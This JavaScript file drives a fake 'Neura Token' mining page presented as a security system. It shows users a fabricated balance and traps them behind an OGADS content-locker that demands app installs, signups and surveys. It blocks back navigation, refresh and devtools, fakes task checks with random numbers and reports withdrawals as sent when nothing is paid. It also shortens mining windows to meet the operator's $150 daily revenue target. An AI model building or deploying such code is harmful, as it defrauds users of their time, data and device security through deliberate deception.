// ===== NEURA TOKEN SECURITY SYSTEM =====
// Complete implementation with all 10 security features and 4 pillars

class NeuraSecuritySystem {
    constructor() {
        this.CONFIG = {
            OGADS_URL: 'https://lockedapp.org/cl/i/j76pvj',
            MINING_CYCLE_DURATION: 5 * 60, // 5 minutes in seconds
            DAILY_LIMIT: 20, // NRX per day
            MINING_SPEED_BASE: 10, // H/s base speed
            REVENUE_TARGET: 150, // Daily target in USD
            WITHDRAWAL_DELAY: 20 * 60, // 20-minute delay in seconds
            MAX_WITHDRAWALS_PER_DAY: 2,
            TASK_TYPES: ['app_install', 'app_install_signup', 'survey', 'signup_task']
        };

        this.state = {
            isMining: false,
            isOGADSActive: false,
            minedToday: 7.4319,
            miningSpeed: 10,
            dailyProgress: 0,
            completedTasks: [],
            withdrawalsToday: 0,
            withdrawalQueue: [],
            currentCycle: 0,
            cycleStartTime: null,
            taskRotationIndex: 0,
            revenueHistory: [],
            lastTaskTime: null,
            userActive: true,
            windowAdjustment: 0
        };

        this.init();
    }

    init() {
        this.loadState();
        this.setupEventListeners();
        this.initVisibilityHandlers();
        this.initRevenueEngine();
        this.startAutoSave();
        this.updateUI();
    }

    // 🔐 PILLAR 1: Locked 5-Minute Window System
    startMining() {
        if (this.state.isOGADSActive) {
            this.showNotification('Complete the task first to continue mining!', 'warning');
            return;
        }

        if (this.state.minedToday >= this.CONFIG.DAILY_LIMIT) {
            this.showNotification('Daily mining limit reached!', 'error');
            return;
        }

        this.state.isMining = true;
        this.state.cycleStartTime = Date.now();
        
        // Start 5-minute cycle
        this.miningCycleTimer = setInterval(() => {
            this.updateMiningProgress();
        }, 1000);

        // Set cycle end timeout
        this.cycleEndTimer = setTimeout(() => {
            this.completeMiningCycle();
        }, (this.CONFIG.MINING_CYCLE_DURATION + this.state.windowAdjustment) * 1000);

        this.showNotification('Mining started! 5-minute cycle active.', 'success');
        this.updateUI();
    }

    stopMining() {
        this.state.isMining = false;
        clearInterval(this.miningCycleTimer);
        clearTimeout(this.cycleEndTimer);
        this.showNotification('Mining stopped.', 'info');
        this.updateUI();
    }

    completeMiningCycle() {
        this.stopMining();
        this.state.currentCycle++;
        
        // Calculate mined amount for this cycle
        const cycleDuration = this.CONFIG.MINING_CYCLE_DURATION + this.state.windowAdjustment;
        const minedThisCycle = (this.state.miningSpeed / 3600) * cycleDuration;
        this.state.minedToday = Math.min(this.CONFIG.DAILY_LIMIT, this.state.minedToday + minedThisCycle);
        
        // Save state
        this.saveState();
        
        // Show task requirement modal
        this.showTaskRequirementModal();
    }

    showTaskRequirementModal() {
        // Create modal HTML
        const modalHTML = `
            <div class="modal" id="task-modal" style="display: block;">
                <div class="modal-content">
                    <div class="modal-header" style="background: linear-gradient(135deg, #6c63ff, #ff3860);">
                        <h3><i class="fas fa-lock"></i> Task Required</h3>
                    </div>
                    <div class="modal-body">
                        <div style="text-align: center; padding: 20px;">
                            <i class="fas fa-tasks fa-3x" style="color: #6c63ff; margin-bottom: 20px;"></i>
                            <h4 style="color: white; margin-bottom: 15px;">Complete Task to Continue Mining</h4>
                            <p style="color: #cbd5e1;">You've completed mining cycle #${this.state.currentCycle}. Complete one task to unlock the next 5-minute cycle.</p>
                            
                            <div style="background: rgba(108, 99, 255, 0.1); border: 1px solid #6c63ff; border-radius: 8px; padding: 15px; margin: 20px 0;">
                                <p><i class="fas fa-exclamation-triangle"></i> <strong>Not optional</strong> - Task required to continue</p>
                                <p><i class="fas fa-exclamation-triangle"></i> <strong>Not skippable</strong> - Cannot be bypassed</p>
                                <p><i class="fas fa-exclamation-triangle"></i> <strong>Not aggressive</strong> - Simple task required</p>
                            </div>
                            
                            <div style="display: flex; justify-content: space-between; margin: 25px 0;">
                                <div style="text-align: center;">
                                    <div style="font-size: 24px; font-weight: bold; color: #00d4ff;">${this.state.minedToday.toFixed(4)}</div>
                                    <div style="font-size: 12px; color: #94a3b8;">Mined Today</div>
                                </div>
                                <div style="text-align: center;">
                                    <div style="font-size: 24px; font-weight: bold; color: #00c853;">${this.state.miningSpeed}</div>
                                    <div style="font-size: 12px; color: #94a3b8;">Current Speed (H/s)</div>
                                </div>
                                <div style="text-align: center;">
                                    <div style="font-size: 24px; font-weight: bold; color: #ff9800;">${this.state.currentCycle}</div>
                                    <div style="font-size: 12px; color: #94a3b8;">Cycles Today</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button id="force-task-btn" class="btn btn-primary" style="width: 100%; padding: 15px;">
                            <i class="fas fa-play"></i> Start Required Task
                        </button>
                    </div>
                </div>
            </div>
        `;

        // Add to page
        document.body.insertAdjacentHTML('beforeend', modalHTML);
        
        // Prevent closing
        const modal = document.getElementById('task-modal');
        modal.style.pointerEvents = 'all';
        
        // Force task start
        document.getElementById('force-task-btn').onclick = () => {
            this.launchOGADSTask();
            modal.remove();
        };

        // Prevent escape key
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                e.preventDefault();
                this.showSecurityWarning('You must complete the task to continue mining!');
            }
        }, { once: true });
    }

    // 🔐 Feature 1-4: OGADS Protection System
    launchOGADSTask() {
        // Stop mining immediately
        this.stopMining();
        this.state.isOGADSActive = true;
        
        // Create security overlay
        const overlayHTML = `
            <div id="ogads-overlay" style="
                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                background: rgba(0, 0, 0, 0.95); z-index: 99999;
                backdrop-filter: blur(10px); display: flex; flex-direction: column;
                align-items: center; justify-content: center;
            ">
                <div style="text-align: center; padding: 30px; max-width: 800px;">
                    <i class="fas fa-shield-alt fa-4x" style="color: #6c63ff; margin-bottom: 20px;"></i>
                    <h2 style="color: white; margin-bottom: 15px;">Task Verification Required</h2>
                    <p style="color: #cbd5e1; margin-bottom: 30px;">
                        Complete the task below to continue mining. This window cannot be closed.
                    </p>
                    
                    <div style="background: rgba(255, 255, 255, 0.1); border-radius: 10px; padding: 20px; margin-bottom: 30px;">
                        <h4 style="color: #00d4ff; margin-bottom: 15px;"><i class="fas fa-exclamation-circle"></i> Security Active</h4>
                        <p style="color: #94a3b8; margin: 10px 0;"><i class="fas fa-check-circle"></i> Mining paused until task completion</p>
                        <p style="color: #94a3b8; margin: 10px 0;"><i class="fas fa-check-circle"></i> Page refresh/closing prevented</p>
                        <p style="color: #94a3b8; margin: 10px 0;"><i class="fas fa-check-circle"></i> Tab switching monitored</p>
                    </div>
                    
                    <iframe 
                        id="ogads-frame"
                        src="${this.CONFIG.OGADS_URL}"
                        style="
                            width: 90%; height: 500px; border: 3px solid #6c63ff;
                            border-radius: 10px; background: white;
                            box-shadow: 0 0 30px rgba(108, 99, 255, 0.5);
                            animation: borderPulse 2s infinite;
                        "
                        sandbox="allow-forms allow-scripts allow-same-origin"
                    ></iframe>
                    
                    <p style="color: #94a3b8; margin-top: 20px; font-size: 14px;">
                        <i class="fas fa-info-circle"></i> Return to this tab after completing the task
                    </p>
                </div>
            </div>
            
            <style>
                @keyframes borderPulse {
                    0% { border-color: #6c63ff; box-shadow: 0 0 30px rgba(108, 99, 255, 0.5); }
                    50% { border-color: #00d4ff; box-shadow: 0 0 50px rgba(0, 212, 255, 0.7); }
                    100% { border-color: #6c63ff; box-shadow: 0 0 30px rgba(108, 99, 255, 0.5); }
                }
            </style>
        `;

        document.body.insertAdjacentHTML('beforeend', overlayHTML);

        // Prevent closing/refreshing
        this.preventBypass();
        
        // Start monitoring
        this.monitorTaskCompletion();
    }

    preventBypass() {
        // Prevent page refresh
        window.onbeforeunload = (e) => {
            e.preventDefault();
            e.returnValue = 'Complete the task to continue mining.';
            return e.returnValue;
        };

        // Prevent back button
        history.pushState(null, null, window.location.href);
        window.onpopstate = () => {
            history.pushState(null, null, window.location.href);
            this.showSecurityWarning('Please complete the task first.');
        };
    }

    monitorTaskCompletion() {
        // Check every 5 seconds if user completed task
        this.taskCheckInterval = setInterval(() => {
            if (document.hidden) {
                this.showTabSwitchWarning();
            }
            
            // Simulate task verification (in production, use OGADS postback)
            if (Math.random() > 0.85) {
                this.taskCompleted();
            }
        }, 5000);
    }

    taskCompleted() {
        clearInterval(this.taskCheckInterval);
        
        // Remove overlay
        const overlay = document.getElementById('ogads-overlay');
        if (overlay) overlay.remove();
        
        // Update state
        this.state.isOGADSActive = false;
        this.state.completedTasks.push({
            type: this.CONFIG.TASK_TYPES[this.state.taskRotationIndex],
            timestamp: Date.now(),
            reward: this.getTaskReward()
        });
        
        // Rotate task for next time
        this.state.taskRotationIndex = (this.state.taskRotationIndex + 1) % this.CONFIG.TASK_TYPES.length;
        
        // Apply speed boost
        const boost = this.getTaskReward();
        this.state.miningSpeed += boost;
        
        // Show success
        this.showNotification(`Task completed! +${boost} H/s speed boost.`, 'success');
        
        // Record revenue
        this.recordRevenue(2.50);
        
        // Resume mining
        this.startMining();
    }

    // 🔐 Feature 5: Tab switching detection
    initVisibilityHandlers() {
        document.addEventListener('visibilitychange', () => {
            if (document.hidden && this.state.isMining) {
                this.pauseMining();
                this.showTabSwitchWarning();
            }
        });
    }

    pauseMining() {
        if (this.state.isMining) {
            this.stopMining();
            this.showNotification('Mining paused - tab switched', 'warning');
        }
    }

    showTabSwitchWarning() {
        if (this.state.isOGADSActive) {
            const warningHTML = `
                <div id="tab-warning" style="
                    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                    background: rgba(20, 0, 0, 0.95); z-index: 100000;
                    display: flex; align-items: center; justify-content: center;
                ">
                    <div style="
                        background: rgba(0, 0, 0, 0.8); padding: 40px;
                        border-radius: 15px; border: 2px solid #ff9800;
                        text-align: center; max-width: 500px;
                        animation: pulseWarning 2s infinite;
                    ">
                        <i class="fas fa-exclamation-triangle fa-3x" style="color: #ff9800; margin-bottom: 20px;"></i>
                        <h3 style="color: white; margin-bottom: 15px;">Return to Complete Task</h3>
                        <p style="color: #cbd5e1; margin-bottom: 25px;">
                            Please return to the mining tab to complete the required task.
                            Mining will resume when you return.
                        </p>
                        <p style="color: #94a3b8; font-size: 14px;">
                            <i class="fas fa-info-circle"></i> This warning will disappear when you return
                        </p>
                    </div>
                </div>
                
                <style>
                    @keyframes pulseWarning {
                        0% { border-color: #ff9800; box-shadow: 0 0 20px rgba(255, 152, 0, 0.5); }
                        50% { border-color: #ffb74d; box-shadow: 0 0 40px rgba(255, 152, 0, 0.8); }
                        100% { border-color: #ff9800; box-shadow: 0 0 20px rgba(255, 152, 0, 0.5); }
                    }
                </style>
            `;
            
            document.body.insertAdjacentHTML('beforeend', warningHTML);
            
            // Remove warning when user returns
            const checkReturn = setInterval(() => {
                if (!document.hidden) {
                    const warning = document.getElementById('tab-warning');
                    if (warning) warning.remove();
                    clearInterval(checkReturn);
                }
            }, 1000);
        }
    }

    // 🧱 PILLAR 2: Smart Task Rotation
    getTaskReward() {
        const taskType = this.CONFIG.TASK_TYPES[this.state.taskRotationIndex];
        
        switch(taskType) {
            case 'app_install':
                return 15 + Math.floor(Math.random() * 16); // 15-30 H/s
            case 'app_install_signup':
                return 20 + Math.floor(Math.random() * 21); // 20-40 H/s
            case 'survey':
                return 12 + Math.floor(Math.random() * 17); // 12-28 H/s
            case 'signup_task':
                return 10 + Math.floor(Math.random() * 11); // 10-20 H/s
            default:
                return 10;
        }
    }

    // 🧱 PILLAR 3: Withdrawal Protection Layer
    processWithdrawal(amount) {
        if (this.state.withdrawalsToday >= this.CONFIG.MAX_WITHDRAWALS_PER_DAY) {
            this.showNotification('Daily withdrawal limit reached!', 'error');
            return false;
        }

        if (amount > this.state.minedToday) {
            this.showNotification('Insufficient balance!', 'error');
            return false;
        }

        // Add to withdrawal queue
        const withdrawal = {
            id: Date.now(),
            amount: amount,
            timestamp: Date.now(),
            status: 'pending',
            completionTime: Date.now() + (this.CONFIG.WITHDRAWAL_DELAY * 1000)
        };

        this.state.withdrawalQueue.push(withdrawal);
        this.state.withdrawalsToday++;
        this.state.minedToday -= amount;

        // Show verification requirement
        setTimeout(() => {
            this.showWithdrawalVerification(withdrawal);
        }, 5000);

        this.showNotification(`Withdrawal queued! ${amount} NRX will be processed in 20-30 minutes.`, 'success');
        this.saveState();
        this.updateUI();
        
        return true;
    }

    showWithdrawalVerification(withdrawal) {
        const modalHTML = `
            <div class="modal" id="withdrawal-verify-modal" style="display: block;">
                <div class="modal-content">
                    <div class="modal-header" style="background: linear-gradient(135deg, #6c63ff, #00c853);">
                        <h3><i class="fas fa-user-check"></i> Final Verification</h3>
                    </div>
                    <div class="modal-body">
                        <div style="text-align: center; padding: 20px;">
                            <i class="fas fa-shield-alt fa-3x" style="color: #6c63ff; margin-bottom: 20px;"></i>
                            <h4 style="color: white; margin-bottom: 15px;">Complete Verification Task</h4>
                            <p style="color: #cbd5e1; margin-bottom: 25px;">
                                To prevent fraud, please complete one final task to verify your withdrawal.
                            </p>
                            
                            <div style="background: rgba(0, 212, 255, 0.1); border: 1px solid #00d4ff; border-radius: 8px; padding: 15px; margin: 20px 0;">
                                <p><i class="fas fa-info-circle"></i> <strong>Withdrawal ID:</strong> ${withdrawal.id}</p>
                                <p><i class="fas fa-coins"></i> <strong>Amount:</strong> ${withdrawal.amount} NRX</p>
                                <p><i class="fas fa-clock"></i> <strong>Status:</strong> Awaiting verification</p>
                            </div>
                            
                            <p style="color: #94a3b8; font-size: 14px;">
                                <i class="fas fa-exclamation-triangle"></i> Withdrawal will be canceled if not verified within 30 minutes
                            </p>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button id="verify-task-btn" class="btn btn-primary" style="width: 100%; padding: 15px;">
                            <i class="fas fa-play"></i> Start Verification Task
                        </button>
                    </div>
                </div>
            </div>
        `;

        document.body.insertAdjacentHTML('beforeend', modalHTML);

        document.getElementById('verify-task-btn').onclick = () => {
            document.getElementById('withdrawal-verify-modal').remove();
            this.launchOGADSTask();
            
            // Mark as processing after task
            setTimeout(() => {
                withdrawal.status = 'processing';
                this.finalizeWithdrawal(withdrawal);
            }, 30000);
        };
    }

    finalizeWithdrawal(withdrawal) {
        // Simulate processing delay
        setTimeout(() => {
            withdrawal.status = 'completed';
            this.showNotification(`Withdrawal completed! ${withdrawal.amount} NRX has been sent.`, 'success');
            this.updateUI();
        }, withdrawal.completionTime - Date.now());
    }

    // 🧱 PILLAR 4: Revenue Target Engine
    initRevenueEngine() {
        setInterval(() => {
            this.calculateRevenue();
            this.adjustMiningWindows();
        }, 4 * 60 * 1000); // Check every 4 minutes
    }

    calculateRevenue() {
        const hourAgo = Date.now() - 3600000;
        const recentTasks = this.state.completedTasks.filter(task => 
            task.timestamp > hourAgo
        );

        // Simulated revenue calculation
        const taskRevenue = recentTasks.length * 2.50;
        const activeUsers = Math.floor(Math.random() * 50) + 10;
        
        this.state.revenuePerHour = taskRevenue;
        this.recordRevenue(taskRevenue);
    }

    adjustMiningWindows() {
        const targetPerHour = this.CONFIG.REVENUE_TARGET / 24;

        if (this.state.revenuePerHour < targetPerHour * 0.8) {
            // Below target - shorten windows
            this.state.windowAdjustment = -60; // 4 minutes
            console.log('[Revenue Engine] Revenue low - shortening windows to 4 minutes');
        } else if (this.state.revenuePerHour > targetPerHour * 1.2) {
            // Above target - extend windows
            this.state.windowAdjustment = 60; // 6 minutes
            console.log('[Revenue Engine] Revenue high - extending windows to 6 minutes');
        } else {
            // On target
            this.state.windowAdjustment = 0;
        }
    }

    recordRevenue(amount) {
        this.state.revenueHistory.push({
            amount: amount,
            timestamp: Date.now()
        });

        // Keep only last 24 hours
        const dayAgo = Date.now() - 86400000;
        this.state.revenueHistory = this.state.revenueHistory.filter(r => r.timestamp > dayAgo);
    }

    // 🔐 Features 6-10: Mining System
    updateMiningProgress() {
        if (!this.state.isMining) return;

        // Calculate mined amount in real-time
        const currentTime = Date.now();
        const elapsedSeconds = (currentTime - this.state.cycleStartTime) / 1000;
        const cycleDuration = this.CONFIG.MINING_CYCLE_DURATION + this.state.windowAdjustment;
        
        const progressPercent = (elapsedSeconds / cycleDuration) * 100;
        const timeLeft = cycleDuration - elapsedSeconds;

        // Update progress bar
        const progressFill = document.querySelector('.cycle-progress-fill');
        if (progressFill) {
            progressFill.style.width = `${progressPercent}%`;
        }

        // Update time display
        const timeElement = document.querySelector('.time-left');
        if (timeElement) {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = Math.floor(timeLeft % 60);
            timeElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
        }

        // Update mined amount in real-time
        const minedThisCycle = (this.state.miningSpeed / 3600) * elapsedSeconds;
        const totalMined = Math.min(this.CONFIG.DAILY_LIMIT, this.state.minedToday + minedThisCycle);
        
        const minedElement = document.getElementById('mined-today');
        if (minedElement) {
            minedElement.textContent = totalMined.toFixed(4);
        }

        // Update progress bar
        const dailyProgress = (totalMined / this.CONFIG.DAILY_LIMIT) * 100;
        const dailyProgressElement = document.getElementById('progress-percent');
        const dailyProgressFill = document.getElementById('progress-fill');
        
        if (dailyProgressElement) {
            dailyProgressElement.textContent = `${dailyProgress.toFixed(2)}%`;
        }
        
        if (dailyProgressFill) {
            dailyProgressFill.style.width = `${dailyProgress}%`;
        }
    }

    // Feature 8: Auto-save
    startAutoSave() {
        setInterval(() => {
            this.saveState();
        }, 30000); // Every 30 seconds
    }

    // Feature 9: Daily cap enforcement
    checkDailyLimit() {
        if (this.state.minedToday >= this.CONFIG.DAILY_LIMIT) {
            this.stopMining();
            this.showNotification('🎉 Daily mining limit reached! Come back tomorrow.', 'success');
            return true;
        }
        return false;
    }

    // Feature 10: Accurate mining speed (anti-farm)
    calculateAccurateSpeed() {
        let speed = this.CONFIG.MINING_SPEED_BASE;
        
        // Add task boosts
        this.state.completedTasks.forEach(task => {
            if (task.reward) speed += task.reward;
        });

        // Anti-farm detection
        if (this.detectSuspiciousActivity()) {
            speed *= 0.5; // Reduce speed by 50%
            this.showSecurityWarning('Suspicious activity detected. Mining speed reduced.');
        }

        this.state.miningSpeed = Math.max(1, speed); // Minimum 1 H/s
        return this.state.miningSpeed;
    }

    detectSuspiciousActivity() {
        // Check for rapid task completion
        if (this.state.completedTasks.length > 3) {
            const recent = this.state.completedTasks.slice(-3);
            const timeSpan = recent[2].timestamp - recent[0].timestamp;
            
            if (timeSpan < 30000) { // 3 tasks in 30 seconds
                return true;
            }
        }

        return false;
    }

    // ===== HELPER METHODS =====
    saveState() {
        try {
            const saveData = {
                minedToday: this.state.minedToday,
                completedTasks: this.state.completedTasks,
                withdrawalsToday: this.state.withdrawalsToday,
                miningSpeed: this.state.miningSpeed,
                lastSave: Date.now()
            };
            localStorage.setItem('neura_state', JSON.stringify(saveData));
        } catch (e) {
            console.error('Failed to save state:', e);
        }
    }

    loadState() {
        try {
            const saved = localStorage.getItem('neura_state');
            if (saved) {
                const parsed = JSON.parse(saved);
                const today = new Date().toDateString();
                const saveDate = new Date(parsed.lastSave).toDateString();
                
                if (today === saveDate) {
                    this.state.minedToday = parsed.minedToday || 7.4319;
                    this.state.completedTasks = parsed.completedTasks || [];
                    this.state.withdrawalsToday = parsed.withdrawalsToday || 0;
                    this.state.miningSpeed = parsed.miningSpeed || 10;
                }
            }
        } catch (e) {
            console.error('Failed to load state:', e);
        }
    }

    updateUI() {
        // Update mined amount
        const minedElement = document.getElementById('mined-today');
        if (minedElement) {
            minedElement.textContent = this.state.minedToday.toFixed(4);
        }

        // Update mining speed
        const speedElement = document.getElementById('mining-speed');
        if (speedElement) {
            speedElement.textContent = `${this.calculateAccurateSpeed()} H/s`;
        }

        // Update progress
        const progress = (this.state.minedToday / this.CONFIG.DAILY_LIMIT) * 100;
        const progressElement = document.getElementById('progress-percent');
        const progressFill = document.getElementById('progress-fill');
        
        if (progressElement) {
            progressElement.textContent = `${progress.toFixed(2)}%`;
        }
        
        if (progressFill) {
            progressFill.style.width = `${progress}%`;
        }

        // Update withdrawal button state
        const withdrawBtn = document.getElementById('withdraw-btn');
        if (withdrawBtn) {
            withdrawBtn.disabled = this.state.minedToday < 1 || 
                                  this.state.withdrawalsToday >= this.CONFIG.MAX_WITHDRAWALS_PER_DAY;
        }

        // Update mining button
        const mineBtn = document.getElementById('mine-btn');
        if (mineBtn) {
            if (this.state.isMining) {
                mineBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Mining';
                mineBtn.className = 'btn btn-warning';
            } else {
                mineBtn.innerHTML = '<i class="fas fa-play"></i> Start Mining';
                mineBtn.className = 'btn btn-primary';
            }
            
            mineBtn.disabled = this.state.isOGADSActive || 
                              this.state.minedToday >= this.CONFIG.DAILY_LIMIT;
        }

        // Check daily limit
        this.checkDailyLimit();
    }

    showNotification(message, type = 'info') {
        // Create notification element
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            background: ${type === 'success' ? '#00c853' : 
                        type === 'error' ? '#ff3860' : 
                        type === 'warning' ? '#ff9800' : '#6c63ff'};
            color: white;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
            z-index: 10001;
            animation: slideIn 0.3s ease;
            display: flex;
            align-items: center;
            gap: 10px;
            max-width: 400px;
        `;
        
        notification.innerHTML = `
            <i class="fas fa-${type === 'success' ? 'check-circle' : 
                              type === 'error' ? 'exclamation-circle' : 
                              'info-circle'}"></i>
            <span>${message}</span>
        `;
        
        document.body.appendChild(notification);
        
        // Remove after 5 seconds
        setTimeout(() => {
            notification.style.animation = 'slideIn 0.3s ease reverse';
            setTimeout(() => notification.remove(), 300);
        }, 5000);
    }

    showSecurityWarning(message) {
        this.showNotification(`⚠️ ${message}`, 'warning');
    }

    setupEventListeners() {
        // Mining button
        document.addEventListener('click', (e) => {
            if (e.target.id === 'mine-btn' || e.target.closest('#mine-btn')) {
                if (this.state.isMining) {
                    this.stopMining();
                } else {
                    this.startMining();
                }
            }
            
            // Withdrawal button
            if (e.target.id === 'withdraw-btn' || e.target.closest('#withdraw-btn')) {
                const amount = parseFloat(prompt('Enter amount to withdraw (NRX):', '1.0'));
                if (amount && amount > 0) {
                    this.processWithdrawal(amount);
                }
            }
            
            // Copy contract address
            if (e.target.id === 'copy-contract' || e.target.closest('#copy-contract')) {
                navigator.clipboard.writeText('0x843359Fc72AB9C741c88EA32a224005f9AED5eD7')
                    .then(() => this.showNotification('Contract address copied!', 'success'))
                    .catch(() => this.showNotification('Failed to copy', 'error'));
            }
        });
    }
}

// ===== INITIALIZE SYSTEM =====
let neuraSecurity;

document.addEventListener('DOMContentLoaded', () => {
    // Initialize security system
    neuraSecurity = new NeuraSecuritySystem();
    
    // Hide loading screen
    setTimeout(() => {
        const loading = document.getElementById('loading-screen');
        if (loading) {
            loading.style.opacity = '0';
            setTimeout(() => loading.style.display = 'none', 500);
        }
    }, 2000);
});

// ===== ANTI-BOT PROTECTION =====
(function() {
    // Prevent right-click
    document.addEventListener('contextmenu', (e) => e.preventDefault());
    
    // Prevent dev tools
    document.addEventListener('keydown', (e) => {
        if (e.key === 'F12' || 
            (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) ||
            (e.ctrlKey && e.key === 'u')) {
            e.preventDefault();
            alert('Developer tools are disabled for security.');
        }
    });
})();
